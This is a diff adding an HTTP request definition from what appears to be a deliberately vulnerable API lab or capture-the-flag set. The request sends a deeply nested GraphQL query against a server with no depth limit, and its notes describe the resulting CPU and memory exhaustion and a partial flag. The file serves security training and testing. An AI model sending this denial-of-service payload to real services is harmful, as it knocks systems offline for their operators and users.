@@ -1,0 +1,36 @@
+meta {
+  name: G02 Nested Query DoS
+  type: http
+  seq: 2
+}
+
+post {
+  url: {{baseUrl}}/graphql
+  body: json
+  auth: none
+}
+
+body:json {
+  {
+    "query": "{ users { orders { user { orders { user { orders { user { username } } } } } } } }"
+  }
+}
+
+docs {
+  # G02: GraphQL Nested Queries (DoS)
+
+  ## Vulnerability
+  No query depth limit allows resource exhaustion.
+
+  ## Exploit
+  Create deeply nested query:
+  users -> orders -> user -> orders -> user -> ...
+
+  ## Impact
+  - Server CPU spike
+  - Memory exhaustion
+  - Denial of Service
+
+  ## Flag
+  VULNAPI{graphql_depth_*}
+}
